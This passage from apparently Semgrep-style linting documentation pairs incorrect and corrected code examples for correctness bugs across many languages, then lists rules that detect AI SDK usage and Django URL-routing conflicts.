    fin = open("file2.txt", 'r')  # First file never closed!
    data2 = fin.read()
    fin.close()
```

**CORRECT**:**

```python
def test2():
    #ok:file-object-redefined-before-close
    fin = open("file1.txt", 'r')
    data = fin.read()
    fin.close()

    fin = open("file2.txt", 'r')
    data2 = fin.read()
    fin.close()
```

When using a tempfile's name before flushing or closing, the file may not exist yet.

**INCORRECT**:**

```python
def main_d():
    fout = tempfile.NamedTemporaryFile('w')
    debug_print(astr)
    fout.write(astr)

    # ruleid:tempfile-without-flush
    cmd = [binary_name, fout.name, *[str(path) for path in targets]]
```

**CORRECT**:**

```python
def main():
    with tempfile.NamedTemporaryFile("w") as fout:
        debug_print(astr)
        fout.write(astr)
        # ok:tempfile-without-flush
        fout.flush()
        cmd = [binary_name, fout.name, *[str(path) for path in targets]]
```

Generators can only be consumed once, so caching them causes errors on subsequent retrievals.

**INCORRECT**:**

```python
# ruleid: cannot-cache-generators
@functools.lru_cache(maxsize=10)
def generator():
    yield 1
```

**CORRECT**:**

```python
# ok: cannot-cache-generators
@functools.lru_cache(maxsize=10)
def not_a_generator():
    return 1
```

**INCORRECT**:**

```python
# ruleid:useless-eqeq
x == x  # Always True

# ruleid:useless-eqeq
print(x != x)  # Always False
```

**INCORRECT**:**

```python
x = 'foo'

# ruleid: is-not-is-not
if x is (not 'hello there'):  # This converts 'hello there' to boolean first!
    pass

# ruleid: is-not-is-not
if x is (not None):  # This checks if x is False!
    pass
```

**CORRECT**:**

```python
# OK
if x is not None:  # Proper identity check
    pass
```

Python implicitly concatenates adjacent strings, which can cause bugs when you forget a comma.

**INCORRECT**:**

```python
# ruleid:string-concat-in-list
bad = ["123" "456" "789"]  # Results in ["123456789"], not 3 elements!

bad = [
    # ruleid:string-concat-in-list
    "abc"
    "cde"
    "efg",
    "hijk"
]
```

**CORRECT**:**

```python
# ok:string-concat-in-list
good = ["123", "456", "789"]
```

Comparisons in tests without assertions are useless.

**INCORRECT**:**

```python
class TestSomething(unittest.TestCase):
    def test_something(self):
        # ruleid: test-is-missing-assert
        a == b  # This does nothing!
```

**CORRECT**:**

```python
class TestSomething(unittest.TestCase):
    def test_something(self):
        # ok: test-is-missing-assert
        assert a == b, "message"
```

**INCORRECT**:**

```python
import pdb as db

def foo():
    # ruleid:pdb-remove
    db.set_trace()
```

**INCORRECT**:**

```python
class A:
    def method1(self, args):
        pass

class B:
    def method1(self, args):
        print('hello there')

# ruleid: baseclass-attribute-override
class C(A, B):  # Both A and B have method1!
    def __init__():
        print("initialized")
```

When `socket.shutdown()` fails, `socket.close()` may not be called, leaking resources.

**INCORRECT**:**

```python
sock = socket.socket(af, socktype, proto)

try:
    # ruleid: socket-shutdown-close
    sock.shutdown(socket.SHUT_RDWR)
    sock.close()  # Not called if shutdown fails!
except OSError:
    pass
```

**CORRECT**:**

```python
try:
    # ok: socket-shutdown-close
    sock.shutdown(socket.SHUT_RDWR)
except OSError:
    pass

try:
    sock.close()
except OSError:
    pass
```

**INCORRECT**:**

```python
class Bad(models.Model):
    title = models.CharField(max_length=255)
    slug = models.SlugField(unique=True, max_length=255)

    # ruleid: django-db-model-save-super
    def save(self, *args, **kwargs):
        if not self.slug:
            self.slug = slugify(self.title)
        # Missing super().save()!
```

**CORRECT**:**

```python
class Post(models.Model):
    title = models.CharField(max_length=255)
    slug = models.SlugField(unique=True, max_length=255)

    # ok: django-db-model-save-super
    def save(self, *args, **kwargs):
        if not self.slug:
            self.slug = slugify(self.title)
        super(Post, self).save(*args, **kwargs)
```

For unique text fields with `blank=True`, `null=True` must also be set to avoid constraint violations.

**INCORRECT**:**

```python
class FakeModel(Model):
    # ruleid: string-field-must-set-null-true
    fieldTwo = models.CharField(
        unique=True,
        blank=True,
        max_length=30
    )
```

**CORRECT**:**

```python
class FakeModel(Model):
    # ok: string-field-must-set-null-true
    fieldThree = models.CharField(
        unique=True,
        null=True,
        blank=True,
        max_length=100
    )
```

For non-text fields, `null=True` should be set if `blank=True` is set.

**INCORRECT**:**

```python
class FakeModel(models.Model):
    # ruleid: nontext-field-must-set-null-true
    fieldInt = models.IntegerField(
        blank=True,
        max_value=30
    )
```

**CORRECT**:**

```python
class FakeModel(models.Model):
    # ok: nontext-field-must-set-null-true
    fieldIntNull = models.IntegerField(
        null=True,
        blank=True,
        max_value=100
    )
```

**INCORRECT**:**

```python
from flask import Flask

app = Flask(__name__)

# ruleid: flask-duplicate-handler-name
@app.route('/hello')
def hello():
    return 'hello'

@app.route('/hi', methods=["POST"])
def hello():  # Same function name!
  return 'hi'
```

**INCORRECT**:**

```python
@app.route('/', method="GET")
def handler_with_get_json(ff):
  # ruleid:avoid-accessing-request-in-wrong-handler
  r = request.json  # GET requests don't have a body!
  return r
```

Use comparison operators, not Python keywords, in SQLAlchemy filters.

**INCORRECT**:**

```python
def test_bad_is_1():
    # ruleid:bad-operator-in-filter
    Model.query.filter(Model.id is 5).first()

def test_bad_and_1():
    # ruleid:bad-operator-in-filter
    Model.query.filter(Model.id == 5 and Model.name == 'hi').first()
```

**CORRECT** - Use `==`, `!=`, `sqlalchemy.and_`, `sqlalchemy.or_`, `sqlalchemy.not_`, and `sqlalchemy.in_` instead.

---

Calling setState with the current state value is always a no-op.

**INCORRECT**:**

```jsx
const [actionsExpanded, setActionsExpanded] = useState<boolean>(false);

<Button
  onClick={() => {
    // ruleid:calling-set-state-on-current-state
    setActionsExpanded(actionsExpanded);  // This does nothing!
  }}
>
```

**CORRECT**:**

```jsx
<Button
  onClick={() => {
    // ok
    setActionsExpanded(!actionsExpanded);  // Toggle the state
  }}
>
```

**INCORRECT**:**

```javascript
function name2() {
  // ruleid: missing-template-string-indicator
  return `this is {start.line}`  // Missing $ before {
}
```

**CORRECT**:**

```javascript
function name() {
  // ok: missing-template-string-indicator
  return `this is ${start.line}`
}
```

**INCORRECT**:**

```javascript
// ruleid:useless-assignment
var x1 = 1;
x1 = 2;  // First assignment is useless

// ruleid:useless-assignment
let x2 = 1;
x2 = 2;
```

**CORRECT**:**

```javascript
// ok:useless-assignment
x4 = {value1: 42};
x4 = {x4, value2: 43};  // Uses previous value

// ok:useless-assignment
y = [1, 2];
y = y.map(function(e) { return e * 2; });
```

JSON.stringify does not produce stable key ordering.

**INCORRECT**:**

```javascript
// ruleid:no-stringify-keys
hashed[JSON.stringify(obj)] = obj;
```

**CORRECT**:**

```javascript
import stableStringify from "json-stable-stringify";

//ok
hashed[stableStringify(obj)] = obj;
```

**INCORRECT**:**

```javascript
// ruleid:eqeq-is-bad
x == x  // Always true
```

---

Loop variables are shared across iterations, so exporting their pointers leads to bugs.

**INCORRECT**:**

```go
func() {
    values := []string{"a", "b", "c"}
    var funcs []func()
    // ruleid:exported_loop_pointer
    for _, val := range values {
        funcs = append(funcs, func() {
            fmt.Println(&val)  // All functions print the same pointer!
        })
    }
}
```

**CORRECT**:**

```go
func() {
    values := []string{"a", "b", "c"}
    var funcs []func()
    // ok:exported_loop_pointer
    for _, val := range values {
        val := val // pin! Create a new variable
        funcs = append(funcs, func() {
            fmt.Println(&val)
        })
    }
}
```

`path.Join` always uses forward slashes, which breaks on Windows.

**INCORRECT**:**

```go
func a(p string) {
	// ruleid: use-filepath-join
	fmt.Println(path.Join(p, "baz"))
}
```

**CORRECT**:**

```go
func a(p string) {
	// ok: use-filepath-join
	fmt.Println(filepath.Join(a.Path, "baz"))
}
```

Converting `strconv.Atoi` result to int16/int32 can overflow.

**INCORRECT**:**

```go
func mainInt16Ex1() {
	// ruleid: integer-overflow-int16
	bigValue, err := strconv.Atoi("2147483648")
	if err != nil {
		panic(err)
	}
	value := int16(bigValue)  // Overflow!
	fmt.Println(value)
}
```

**CORRECT** - Use `strconv.ParseInt` with the appropriate bit size.

File permissions above 0600 violate the principle of least privilege.

**INCORRECT**:**

```go
func test_chmod() {
	// ruleid: incorrect-default-permission
	err := os.Chmod("/tmp/somefile", 0777)
}

func test_mkdir() {
	// ruleid: incorrect-default-permission
	err := os.Mkdir("/tmp/mydir", 0777)
}
```

**CORRECT**:**

```go
func test_chmod() {
	// ok: incorrect-default-permission
	err := os.Chmod("/tmp/somefile", 0400)
}

func test_mkdir() {
	// ok: incorrect-default-permission
	err := os.MkdirAll("/tmp/mydir", 0600)
}
```

**INCORRECT**:**

```go
var y = "hello";
// ruleid:eqeq-is-bad
fmt.Println(y == y)  // Always true
```

---

Strings should be compared with `.equals()`, not `==`.

**INCORRECT**:**

```java
public class Example {
    public int foo(String a, int b) {
        // ruleid:no-string-eqeq
        if (a == "hello") return 1;
        // ruleid:no-string-eqeq
        if ("hello" == a) return 2;
    }
}
```

**CORRECT**:**

```java
public class Example {
    public int foo(String a, int b) {
        //ok:no-string-eqeq
        if (b == 2) return -1;  // Primitives are OK
        //ok:no-string-eqeq
        if (null == "hello") return 12;  // null checks are OK
    }
}
```

**INCORRECT**:**

```java
class Bar {
    void main() {
        boolean myBoolean;

        // ruleid:eqeq
        if (myBoolean == myBoolean) {
            continue;
        }

        // ruleid:eqeq
        if (myBoolean != myBoolean) {
            continue;
        }
    }
}
```

**INCORRECT**:**

```java
class Bar {
    void main() {
        boolean myBoolean;

        // ruleid:assignment-comparison
        if (myBoolean = true) {  // Assignment, not comparison!
            continue;
        }
    }
}
```

**CORRECT**:**

```java
// ok:assignment-comparison
if (myBoolean) {
}
```

---

The `ato*()` functions can cause undefined behavior and integer overflows.

**INCORRECT**:**

```c
#include <stdlib.h>

int main() {
    const char *buf = "";

    // ruleid:incorrect-use-ato-fn
    int i = atoi(buf);

    // ruleid:incorrect-use-ato-fn
    long j = atol(buf);

    // ruleid:incorrect-use-ato-fn
    long long k = atoll(buf);
}
```

**CORRECT**:**

```c
#include <stdlib.h>

int main() {
    const char *buf = "";

    // ok:incorrect-use-ato-fn
    long l = strtol(buf, NULL, 10);

    // ok:incorrect-use-ato-fn
    long long m = strtol(buf, NULL, 10);
}
```

`sscanf()` can cause undefined behavior and integer overflows.

**INCORRECT**:**

```c
const char *float_str = "3.1415926535897932384626433832";

float f;
// ruleid:incorrect-use-sscanf-fn
read = sscanf(float_str, "%f", &f);

int i;
// ruleid:incorrect-use-sscanf-fn
read = sscanf(int_str, "%d", &i);
```

**CORRECT**:**

```c
// ok:incorrect-use-sscanf-fn
f = strtof(float_str, NULL);

// ok:incorrect-use-sscanf-fn
li = strtol(int_str, NULL, 0);
```

---

`Double.Epsilon` is unsuitable for equality comparisons of non-zero values.

**INCORRECT**:**

```csharp
static bool IsApproximatelyEqual(double value1, double value2, double epsilon)
{
   double divisor = Math.Max(value1, value2);
   //ruleid: correctness-double-epsilon-equality
   return Math.Abs((value1 - value2) / divisor) <= Double.Epsilon;
}

static bool lazyEqualLeftCompare(double v1, double v2){
   //ruleid: correctness-double-epsilon-equality
   return Math.Abs(v1 - v2) <= Double.Epsilon;
}
```

**CORRECT** - Use the framework's `Equals()` method or a more appropriate epsilon value:**

```csharp
static bool isZero(double arg){
   double zero = 0;
   //ok - comparing to zero is acceptable
   return Math.Abs(arg - zero) <= Double.Epsilon;
}
```

When persisting RegionInfo between processes, use full culture names, not two-letter codes.

**INCORRECT**:**

```csharp
// Creates a RegionInfo using the ISO 3166 two-letter code.
RegionInfo myRI1 = new RegionInfo( "US" );

using (AnonymousPipeServerStream pipeServer = ...){
using(StreamWriter sw = new StreamWriter(pipeServer)){
   //ruleid: correctness-regioninfo-interop
   sw.WriteLine(myRI1);  // Two-letter code may not persist correctly
}}
```

**CORRECT**:**

```csharp
// Creates a RegionInfo using a CultureInfo.LCID.
RegionInfo myRI2 = new RegionInfo( new CultureInfo("en-US",false).LCID );

using(StreamWriter sw = new StreamWriter(pipeServer)){
   //ok
   sw.WriteLine(myRI2);
}
```

---

Do not call `render` after `save` on an ActiveRecord object. Reloading will repeat the operation.

**INCORRECT**:**

```ruby
def createbad
  @article = Article.new(title: "...", body: "...")
  @article.save
  # ruleid: rails-no-render-after-save
  render @article
end
```

**CORRECT**:**

```ruby
def create
  @article = Article.new(title: "...", body: "...")

  if @article.save
    redirect_to @article  # Use redirect, not render
  else
    # ok: rails-no-render-after-save
    render :new, status: :unprocessable_entity
  end
end
```

---

Checking `indexOf > 0` ignores the first element (index 0).

**INCORRECT**:**

```scala
def bad1(){
   val color = "blue"
   val strings = List("blue", "bob")
   // ruleid: positive-number-index-of
   if(strings.indexOf(color) > 0){  // Misses index 0!
      println("This is if statement");
   }
}
```

**CORRECT**:**

```scala
def ok1() {
   val color = "blue"
   val strings = List("blue", "bob")
   // ok: positive-number-index-of
   if(strings.indexOf(color) > -1){  // Correct: checks all indices
      println("This is if statement");
   }
}

def ok2(){
   val name = "bob"
   // ok: positive-number-index-of
   if(name.indexOf("b") >= 0){  // Also correct
      println("This is if statement");
   }
}
```

---

Atoms are never garbage collected. Dynamic atom creation from user input leads to memory leaks.

**INCORRECT**:**

```elixir
# ruleid: atom_exhaustion
String.to_atom("dynamic")

# ruleid: atom_exhaustion
List.to_atom(~c"dynamic")
```

**CORRECT** - Use `String.to_existing_atom` or `List.to_existing_atom` instead.

---

Unquoted variables are split on whitespace, which can cause bugs.

**INCORRECT**:**

```bash
# ruleid: unquoted-variable-expansion-in-command
exec $foo

# ruleid: unquoted-variable-expansion-in-command
exec ${foo}

# ruleid: unquoted-variable-expansion-in-command
exec $1
```

**CORRECT**:**

```bash
# ok: unquoted-variable-expansion-in-command
exec "$foo"

# ok: unquoted-variable-expansion-in-command
exec "${foo}"

# ok: unquoted-variable-expansion-in-command
exec "$1"
```

**INCORRECT**:**

```bash
# ruleid: unquoted-command-substitution-in-command
exec $(foo)

# ruleid: unquoted-command-substitution-in-command
exec `foo`
```

**CORRECT**:**

```bash
# ok: unquoted-command-substitution-in-command
exec "$(foo)"

# ok: unquoted-command-substitution-in-command
exec "`foo`"
```

---

Use `=` and `<>` for structural comparison, not `==` and `!=`.

**INCORRECT**:**

```ocaml
let test xs ys =
  (* ruleid:physical-not-equal *)
  if xs != ys
  then 1
  else 2

let test2 xs ys =
  (* ruleid:physical-equal *)
  if xs == ys
  then 1
  else 2
```

**CORRECT** - Use `=` for structural equality and `<>` for structural inequality.

**INCORRECT**:**

```ocaml
let test a b =
  (* ruleid:useless-compare *)
  let c = compare (a+b) (a+b) in  (* Always returns 0 *)
  if c <> 0 then c
  else
    compare a b

let test a b =
  (* ruleid:useless-equal *)
  if a+b = a+b  (* Always true *)
  then 1
  else 2
```

**INCORRECT**:**

```ocaml
let test a b =
  (* ruleid:ocamllint-useless-if *)
  if foo
  then a+b
  else a+b  (* Both branches are identical! *)
```

### 0.6 Code Maintainability

**Impact: LOW**

These rules help organizations track and govern the use of AI and LLM services in their codebase. Detecting "shadow AI" usage is important for compliance, security auditing, and understanding AI dependencies.

**Severity:** INFO

**Message:** Possibly found usage of AI: OpenAI

Detects usage of OpenAI APIs in Go code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```go
func New(cfg Config) *Handler {
	h := &Handler{
		cfg:     cfg,
		clients: make([]*Client, len(cfg.Keys)),
	}
	for i, key := range cfg.Keys {
		c := &Client{
			id:     i,
            // ruleid: detect-openai
			Client: gogpt.NewClient(key),
		}
		h.clients[i] = c
	}
	return h
}
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Gemini

Detects usage of Google Gemini APIs in Go code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```go
// ruleid: detect-gemini
import "github.com/google/generative-ai-go/genai"
import "google.golang.org/api/option"

ctx := context.Background()
// Access your API key as an environment variable (see "Set up your API key" above)
// ruleid: detect-gemini
client, err := genai.NewClient(ctx, option.WithAPIKey(os.Getenv("API_KEY")))
if err != nil {
    log.Fatal(err)
}
defer client.Close()

model := client.GenerativeModel("gemini-1.5-flash")
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Anthropic

Detects usage of Anthropic Claude APIs in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-anthropic
import anthropic

# ruleid: detect-anthropic
client = anthropic.Anthropic(
    # defaults to os.environ.get("ANTHROPIC_API_KEY")
    api_key="my_api_key",
)

# ruleid: detect-anthropic
message = client.messages.create(
    model="claude-3-opus-20240229",
    max_tokens=1024,
    messages=[
        {"role": "user", "content": "Hello, Claude"}
    ]
)
print(message.content)
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: OpenAI

Detects usage of OpenAI APIs in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
OPENAI_API_KEY = "MY_API_KEY"
# ruleid: detect-openai
from openai import OpenAI
# ruleid: detect-openai
client = OpenAI(
    # Defaults to os.environ.get("OPENAI_API_KEY")
)
# ruleid: detect-openai
chat_completion = client.chat.completions.create(
    model="gpt-3.5-turbo",
    messages=[{"role": "user", "content": "Hello world"}]
)
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Gemini

Detects usage of Google Gemini APIs in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-gemini
import google.generativeai as genai
import os

genai.configure(api_key=os.environ["API_KEY"])

model = genai.GenerativeModel('gemini-1.5-flash')
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Mistral

Detects usage of Mistral APIs in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
import os
# ruleid: detect-mistral
from mistralai.client import MistralClient
# ruleid: detect-mistral
from mistralai.models.chat_completion import ChatMessage

api_key = os.environ["MISTRAL_API_KEY"]
model = "mistral-large-latest"

# ruleid: detect-mistral
client = MistralClient(api_key=api_key)

# ruleid: detect-mistral
chat_response = client.chat(
    model=model,
    messages=[ChatMessage(role="user", content="What is the best French cheese?")]
)

print(chat_response.choices[0].message.content)
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI tooling: LangChain

Detects usage of LangChain framework in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-langchain
from langchain_openai import ChatOpenAI

# ruleid: detect-langchain
llm = ChatOpenAI()

# ruleid: detect-langchain
from langchain_community.llms import Ollama
# ruleid: detect-langchain
llm = Ollama(model="llama2")

# ruleid: detect-langchain
from langchain_anthropic import ChatAnthropic

# ruleid: detect-langchain
llm = ChatAnthropic(model="claude-3-sonnet-20240229", temperature=0.2, max_tokens=1024)

# ruleid: detect-langchain
from langchain_cohere import ChatCohere

# ruleid: detect-langchain
llm = ChatCohere(cohere_api_key="...")
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI tooling: Tensorflow

Detects usage of TensorFlow in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-tensorflow
import tensorflow as tf
print("TensorFlow version:", tf.__version__)

# ruleid: detect-tensorflow
from tensorflow.keras import layers
# ruleid: detect-tensorflow
from tensorflow.keras import losses
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI tooling: PyTorch

Detects usage of PyTorch in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-pytorch
import torch
# ruleid: detect-pytorch
x = torch.rand(5, 3)
print(x)
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: HuggingFace

Detects usage of HuggingFace Hub in Python code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```python
# ruleid: detect-huggingface
from huggingface_hub import HfApi

api = HfApi()
api.create_repo(repo_id="super-cool-model")
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: OpenAI

Detects usage of OpenAI APIs in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-openai
import OpenAI from "openai";

OPENAI_API_KEY = "asdf"

// ruleid: detect-openai
const openai = new OpenAI({
    apiKey: process.env.OPENAI_API_KEY,
});

// ruleid: detect-openai
const chatCompletion = await openai.chat.completions.create({
    messages: [{ role: "user", content: "Say this is a test" }],
    model: "gpt-3.5-turbo",
});
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Anthropic

Detects usage of Anthropic Claude APIs in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-anthropic
import Anthropic from '@anthropic-ai/sdk';

// ruleid: detect-anthropic
const anthropic = new Anthropic({
  apiKey: 'my_api_key', // defaults to process.env["ANTHROPIC_API_KEY"]
});

// ruleid: detect-anthropic
const msg = await anthropic.messages.create({
  model: "claude-3-opus-20240229",
  max_tokens: 1024,
  messages: [{ role: "user", content: "Hello, Claude" }],
});
console.log(msg);
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Gemini

Detects usage of Google Gemini APIs in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-gemini
const { GoogleGenerativeAI } = require("@google/generative-ai");

// Access your API key as an environment variable (see "Set up your API key" above)
// ruleid: detect-gemini
const genAI = new GoogleGenerativeAI(process.env.API_KEY);

// ruleid: detect-gemini
const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash"});
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Mistral

Detects usage of Mistral APIs in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-mistral
import MistralClient from '@mistralai/mistralai';

const apiKey = process.env.MISTRAL_API_KEY;

// ruleid: detect-mistral
const client = new MistralClient(apiKey);

// ruleid: detect-mistral
const chatResponse = await client.chat({
  messages: [{role: 'user', content: 'What is the best French cheese?'}],
  model: 'mistral-large-latest',
});

console.log('Chat:', chatResponse.choices[0].message.content);
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: VercelAI

Detects usage of Vercel AI SDK in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-vercel-ai
import { generateText } from "ai"
// ruleid: detect-vercel-ai
import { openai } from "@ai-sdk/openai"
// ruleid: detect-vercel-ai
const { text } = await generateText({
    model: openai("gpt-4-turbo"),
    prompt: "What is love?"
})

// ruleid: detect-vercel-ai
import { generateText } from "ai"
// ruleid: detect-vercel-ai
import { anthropic } from "@ai-sdk/anthropic"
// ruleid: detect-vercel-ai
const { text } = await generateText({
    model: anthropic("claude-3-opus-20240229"),
    prompt: "What is love?"
})
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI tooling: promptfoo

Detects usage of promptfoo LLM evaluation framework in TypeScript/JavaScript code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```typescript
// ruleid: detect-promptfoo
import promptfoo from 'promptfoo';

// ruleid: detect-promptfoo
const results = await promptfoo.evaluate(testSuite, options);
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Gemini

Detects usage of Google Gemini APIs in Kotlin code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```kotlin
package com.google.ai.sample

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import androidx.navigation.compose.NavHost
import androidx.navigation.compose.composable
import androidx.navigation.compose.rememberNavController
// ruleid: detect-gemini
import com.google.ai.sample.feature.chat.ChatRoute
// ruleid: detect-gemini
import com.google.ai.sample.feature.multimodal.PhotoReasoningRoute
// ruleid: detect-gemini
import com.google.ai.sample.feature.text.SummarizeRoute
// ruleid: detect-gemini
import com.google.ai.sample.ui.theme.GenerativeAISample

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContent {
            GenerativeAISample {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val navController = rememberNavController()

					// ruleid: detect-gemini
					val generativeModel = GenerativeModel(
						modelName = "gemini-1.5-flash",
						apiKey = BuildConfig.apiKey
					)
                }
            }
        }
    }
}
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Gemini

Detects usage of Google Gemini APIs in Swift code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```swift
// ruleid: detect-gemini
import GoogleGenerativeAI

// Access your API key from your on-demand resource .plist file (see "Set up your API key" above)
// ruleid: detect-gemini
let model = GenerativeModel(name: "gemini-1.5-flash", apiKey: APIKey.default)

let prompt = "Write a story about a magic backpack."
let response = try await model.generateContent(prompt)
if let text = response.text {
  print(text)
}
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: Apple CoreML

Detects usage of Apple CoreML in Swift code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```swift
class ImagePredictor {
    static func createImageClassifier() -> VNCoreMLModel {
        // Use a default model configuration.
		// ruleid: detect-apple-core-ml
        let defaultConfig = MLModelConfiguration()

        // Create an instance of the image classifier's wrapper class.
        let imageClassifierWrapper = try? MobileNet(configuration: defaultConfig)

        guard let imageClassifier = imageClassifierWrapper else {
            fatalError("App failed to create an image classifier model instance.")
        }

        // Get the underlying model instance.
        let imageClassifierModel = imageClassifier.model

        // Create a Vision instance using the image classifier's model instance.
		// ruleid: detect-apple-core-ml
        guard let imageClassifierVisionModel = try? VNCoreMLModel(for: imageClassifierModel) else {
            fatalError("App failed to create a `VNCoreMLModel` instance.")
        }

        return imageClassifierVisionModel
    }
}
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: OpenAI

Detects usage of OpenAI APIs in C# code.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```csharp
// ruleid: detect-openai
using OpenAI.Chat;

// ruleid: detect-openai
ChatClient client = new("gpt-3.5-turbo", Environment.GetEnvironmentVariable("OPENAI_API_KEY"));

// ruleid: detect-openai
ChatCompletion chatCompletion = client.CompleteChat(
    [
        new UserChatMessage("Say 'this is a test.'")
    ]);
```

---

**Severity:** INFO

**Message:** Possibly found usage of AI: HTTP Request

Detects direct HTTP requests to AI API endpoints.

**References:**

- https://semgrep.dev/blog/2024/detecting-shadow-ai

**Flagged code: usage detected**

```javascript
const rawRes = await fetchWithTimeout(
    // ruleid: detect-generic-ai-api
   `https://${baseURL}/v1/chat/completions`,
   {
     headers: {
       "Content-Type": "application/json",
       Authorization: `Bearer ${apiKey}`
     },
     timeout,
     method: "POST",
     body: JSON.stringify({
       model,
       messages: messages.map(k => ({ role: k.role, content: k.content })),
       temperature,
       stream: true
     })
   }
 )
```

---

**Severity:** ERROR

**Message:** The path for `$URL` is assigned once to view `$VIEW` and once to `$DIFFERENT_VIEW`, which can lead to unexpected behavior. Verify what the intended target view is and delete the other route.

This rule detects when the same URL path is mapped to different views, which causes routing confusion.

**Incorrect code: hard to maintain**

```python
from django.urls import path

# ruleid: conflicting-path-assignment
urlpatterns = [
    path('path/to/view', views.example_view, name="test"),
    path('path/to/view', views.other_view, name="test"),
]

# ruleid: conflicting-path-assignment
urlpatterns = [
    path('path/to/view', views.example_view, name="test"),
    path('path/to/other_view', view.other_view, name="hello"),
    path('path/to/view', views.other_view, name="test"),
]

# ruleid: conflicting-path-assignment
urlpatterns = [
    path('path/to/view', views.example_view),
    path('path/to/view', views.other_view),
]
```

**Correct code: maintainable**

```python
from django.urls import path

# ok: duplicate-path-assignment-different-names, conflicting-path-assignment, duplicate-path-assignment
urlpatterns = [
    path('path/to/other_view', views.example_view, name="test"),
    path('path/to/view', views.example_view, name="test"),
]

# ok: duplicate-path-assignment-different-names, conflicting-path-assignment, duplicate-path-assignment
urlpatterns = [
    path('path/to/other_view', views.example_view, name="test"),
    path('path/to/view', views.other_view, name="test_abc"),
]
```

---

**Severity:** WARNING

**Message:** path for `$URL` is assigned twice with different names

This rule detects when the same URL path and view are registered with different names, which can cause confusion.

**Incorrect code: hard to maintain**

```python
from django.urls import path

# ruleid: duplicate-path-assignment-different-names, duplicate-path-assignment
urlpatterns = [
    path('path/to/view', views.example_view, name="test"),
    path('path/to/view', views.example_view, name="other_name"),
]

# ruleid: duplicate-path-assignment-different-names, duplicate-path-assignment
urlpatterns = [
    path('path/to/view', views.example_view, {'abc': 'def'}, name="test"),
    path('path/to/view', views.example_view, {'abc': 'def'}, name="other_name"),
]
```

---

**Severity:** ERROR

**Message:** The name `$NAME` is used for both `$URL` and `$OTHER_URL`, which can lead to unexpected behavior when using URL reversing. Pick a unique name for each path.

**References:**

- https://docs.djangoproject.com/en/3.2/topics/http/urls/#naming-url-patterns

**Incorrect code: hard to maintain**

```python
from django.urls import path

# ruleid: duplicate-name-assignment
urlpatterns = [
    path('path/to/view', views.example_view, name="test123"),
    path('path/to/other/view', views.other_view, name="test123"),
]
```

---

**Severity:** WARNING

**Message:** if block checks for the same condition on both branches (`$X`)

This rule detects if-elif chains where the same condition is checked multiple times.

**References:**

- https://docs.python.org/3/tutorial/controlflow.html

**Incorrect code: hard to maintain**

```python
a, b, c = 1

# ruleid: useless-if-conditional
if a:
    print('1')
elif a:
    print('2')
```

**Correct code: maintainable**

```python
# a and b are different cases -- ok
if a:
    print('1')
elif b:
    print('1')


# don't report on cases like this
if a:
    print('this is a')
elif b:
    print('this is b')
elif c:
    print('this is c')
elif d:
    print('this is d')
```

---

**Severity:** WARNING

